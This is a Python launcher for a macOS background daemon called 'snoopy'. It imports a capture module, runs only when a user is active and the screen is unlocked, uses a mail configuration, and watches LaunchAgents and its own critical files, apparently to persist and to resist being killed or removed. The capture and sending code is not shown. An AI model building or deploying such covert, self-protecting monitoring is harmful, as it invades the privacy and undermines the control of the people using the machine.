#!/usr/bin/env python

import os
import Quartz
from lib.file_finder import get_embedded_filename
from lib.daemon import Daemon
from darwin.killer import GracefulKiller
from darwin.config_event_handler import ConfigFileEventHandler
from darwin import capture as catcher

# NOTE: the Quartz module is part of the pyobjc install
# pip install pyobjc

home              = os.getenv("HOME")
directory         = 'HOME_DIRECTORY'
config_dir        = '{}/config'.format(directory)
installation_path = '{}/dist'.format(directory)
launchd_path      = '/Library/LaunchAgents'
secret_key        = 'SUPER_SECRET_KEY'
mail_config       = 'mail.config'
reloader_name     = 'a.out'


def get_critical_files():
    return [
        get_embedded_filename(reloader_name),
        get_embedded_filename(mail_config),
        get_embedded_filename('snoopy'),
    ]


def get_plist_filename(s=None):
    suffix = '.{}'.format(s) if s else ""
    return 'com.reedcwilson.snoopy{}.plist'.format(suffix)


class MyDaemon(Daemon):
    def __init__(self):
        Daemon.__init__(
            self,
            mail_config,
            secret_key,
            installation_path,
            directory,
            catcher)

    def should_execute(self):
        d = Quartz.CGSessionCopyCurrentDictionary()
        return (
            d and
            d.get("CGSSessionScreenIsLocked", 0) == 0 and
            d.get("kCGSSessionOnConsoleKey", 0) == 1)

    def setup(self):
        # the graceful killer registers events on init
        GracefulKiller(
            get_embedded_filename(reloader_name),
            self.notifier,
            get_critical_files())
        config_event_handler = ConfigFileEventHandler(
            self.notifier,
            config_dir,
            launchd_path,
            get_plist_filename())
        self.observer.schedule(
            config_event_handler,
            launchd_path,
            recursive=False)


if __name__ == "__main__":
    daemon = MyDaemon()
    daemon.run()
